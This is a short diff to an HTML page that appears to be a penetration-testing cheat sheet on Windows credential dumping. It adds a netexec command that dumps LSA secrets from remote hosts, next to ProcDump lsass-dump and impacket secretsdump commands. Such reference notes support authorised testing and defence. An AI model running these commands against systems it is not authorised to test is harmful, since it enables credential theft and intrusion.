@@ -1011,6 +1011,10 @@ nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="o">
 <p>Dump lsass process from memory using ProcDump from SysInternals Suit:</p>
 <div class="highlight"><pre><span></span><code>procdump.exe<span class="w"> </span>-accepteula<span class="w"> </span>-ma<span class="w"> </span>lsass.exe<span class="w"> </span>&lt;output<span class="w"> </span>path&gt;
 </code></pre></div>
+<p>Dump lsass with <code>netexec</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Using netexec</span>
+nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>CIDR&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;account<span class="w"> </span>username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;account<span class="w"> </span>password&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>--lsa
+</code></pre></div>
 <p>Dump all available credentials with impacket's <code>secretdump.py</code> script:</p>
 <div class="highlight"><pre><span></span><code>secretdump.py<span class="w"> </span><span class="o">[[</span>domain/<span class="o">]</span>username<span class="o">[</span>:password<span class="o">]</span>@<span class="o">]</span>&lt;targetName<span class="w"> </span>or<span class="w"> </span>address&gt;
 </code></pre></div>
